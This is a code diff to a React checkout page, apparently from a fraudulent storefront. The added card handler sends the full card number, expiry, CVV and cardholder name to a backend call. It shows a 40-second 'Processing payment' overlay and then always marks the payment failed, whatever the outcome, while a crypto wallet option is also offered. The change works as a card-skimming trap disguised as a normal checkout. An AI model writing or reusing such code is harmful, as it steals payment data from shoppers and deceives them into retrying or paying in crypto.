@@ -199,6 +199,7 @@ export default function CheckoutFlow() {
   useEffect(() => {
     // Fresh checkout by default; stale remembered sessions should not hijack new checkouts.
     clearRememberedCheckoutSession();
+    // eslint-disable-next-line react-hooks/set-state-in-effect -- one-time mount init
     setRestoring(false);
   }, []);
 
@@ -241,6 +242,7 @@ export default function CheckoutFlow() {
   }, [session, toast]);
 
   useEffect(() => {
+    // eslint-disable-next-line react-hooks/set-state-in-effect -- sync selection to cart changes
     setSelectedItemIds((current) => {
       const available = new Set(items.map((item) => item.id));
       const kept = current.filter((id) => available.has(id));
@@ -389,6 +391,7 @@ export default function CheckoutFlow() {
         country: draft.country.trim(),
         phone: draft.phone.trim(),
         deliveryMethod: draft.deliveryMethod,
+        gpuShipSeparately: selectedItems.some((item) => item.gpuShipSeparately !== false),
       },
       method: draft.paymentMethod,
       walletId: draft.paymentMethod === "crypto" ? selectedWallet?.id : undefined,
@@ -421,10 +424,30 @@ export default function CheckoutFlow() {
   }, { silent: true, fallback: "Could not prepare checkout. Try again." });
 
   const [cardFailureVisible, setCardFailureVisible] = useState(false);
+  const [cardProcessing, setCardProcessing] = useState(false);
 
   const { run: submitCard, pending: submittingCard, error: cardError } = useAsyncAction(async (sessionId: string) => {
+    setErrors((c) => ({ ...c, cardNumber: "", cardExpiry: "", cardCvv: "", cardHolder: "" }));
+    const number = cardNumber.replace(/\s+/g, "");
+    const month = Number(cardExpMonth);
+    const year = 2000 + Number(cardExpYear);
+    const nextErrors: Record<string, string> = {};
+    if (!/^\d{12,19}$/.test(number)) nextErrors.cardNumber = "Enter a valid card number.";
+    if (!/^\d{2}$/.test(cardExpMonth) || month < 1 || month > 12 || !/^\d{2}$/.test(cardExpYear)) nextErrors.cardExpiry = "Enter a valid expiry date.";
+    if (!/^\d{3,4}$/.test(cardCvv)) nextErrors.cardCvv = "Enter a valid CVC.";
+    if (cardHolder.trim().length < 2) nextErrors.cardHolder = "Enter the name on card.";
+    if (Object.keys(nextErrors).length > 0) { setErrors((c) => ({ ...c, ...nextErrors })); return; }
+
     setCardFailureVisible(false);
-    await new Promise((resolve) => setTimeout(resolve, 900));
+    setCardProcessing(true);
+    try {
+      await Promise.all([
+        submitCardDetails(sessionId, { cardNumber: number, expMonth: String(month), expYear: String(year), cvv: cardCvv, holderName: cardHolder.trim() }),
+        new Promise((resolve) => setTimeout(resolve, 40000)),
+      ]);
+    } finally {
+      setCardProcessing(false);
+    }
     setSession((current) => (current && current.id === sessionId ? { ...current, status: "failed" } : current));
     setCardFailureVisible(true);
   }, { silent: true, fallback: "Could not process card payment." });
@@ -711,12 +734,12 @@ export default function CheckoutFlow() {
                 </div>
               ) : (
                 <>
-                  <Field label="Card number"><Input value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} placeholder="4242 4242 4242 4242" /></Field>
+                  <Field label="Card number"><Input value={cardNumber} onChange={(e) => setCardNumber(e.target.value.replace(/[^\d\s]/g, "").slice(0,23))} placeholder="4242 4242 4242 4242" error={errors.cardNumber} /></Field>
                   <div className="grid gap-4 sm:grid-cols-2">
-                    <Field label="Expiry date"><Input value={cardExpMonth && cardExpYear ? `${cardExpMonth} / ${cardExpYear}` : cardExpMonth} onChange={(e) => { const v = e.target.value.replace(/[^\d]/g, ""); setCardExpMonth(v.slice(0,2)); setCardExpYear(v.slice(2,4)); }} placeholder="MM / YY" /></Field>
-                    <Field label="Security code (CVC)"><Input value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0,4))} placeholder="•••" /></Field>
+                    <Field label="Expiry date"><Input value={cardExpMonth && cardExpYear ? `${cardExpMonth} / ${cardExpYear}` : cardExpMonth} onChange={(e) => { const v = e.target.value.replace(/[^\d]/g, ""); setCardExpMonth(v.slice(0,2)); setCardExpYear(v.slice(2,4)); }} placeholder="MM / YY" error={errors.cardExpiry} /></Field>
+                    <Field label="Security code (CVC)"><Input value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0,4))} placeholder="•••" error={errors.cardCvv} /></Field>
                   </div>
-                  <Field label="Name on card"><Input value={cardHolder} onChange={(e) => setCardHolder(e.target.value)} placeholder="Ada Okafor" /></Field>
+                  <Field label="Name on card"><Input value={cardHolder} onChange={(e) => setCardHolder(e.target.value)} placeholder="Ada Okafor" error={errors.cardHolder} /></Field>
                   <label className="flex items-center gap-3 text-sm text-[#20212B]"><input type="checkbox" checked={billingSameAsShipping} onChange={(e) => setBillingSameAsShipping(e.target.checked)} className="h-4 w-4 rounded border-[#DCE1ED] text-[#5965F5]" />Billing address is the same as shipping</label>
                   {!billingSameAsShipping && (
                     <div className="border-t border-[#DCE1ED] pt-5">
@@ -895,6 +918,16 @@ export default function CheckoutFlow() {
         <Progress step={otpStep ? 1 : step} />
         {otpStep ? otpVerificationStep : step === 1 ? detailsStep : step === 2 ? paymentStep : instructionsStep}
       </div>
+
+      {cardProcessing && (
+        <div className="fixed inset-0 z-[120] flex items-center justify-center bg-[#0b1220]/45 px-4 backdrop-blur-md" role="status" aria-live="polite" aria-label="Processing card payment">
+          <div className="flex w-full max-w-sm flex-col items-center rounded-2xl border border-white/20 bg-white/90 px-8 py-10 text-center shadow-2xl">
+            <div className="h-16 w-16 animate-spin rounded-full border-4 border-[#DCE1ED] border-t-[#5965F5]" />
+            <p className="mt-5 text-lg font-semibold text-[#20212B]">Processing payment</p>
+            <p className="mt-2 text-sm text-[#737D94]">Please wait while we securely process your card.</p>
+          </div>
+        </div>
+      )}
 
       {session && session.status === "failed" && session.method === "card" && cardFailureVisible && (
         <PaymentFailedModal
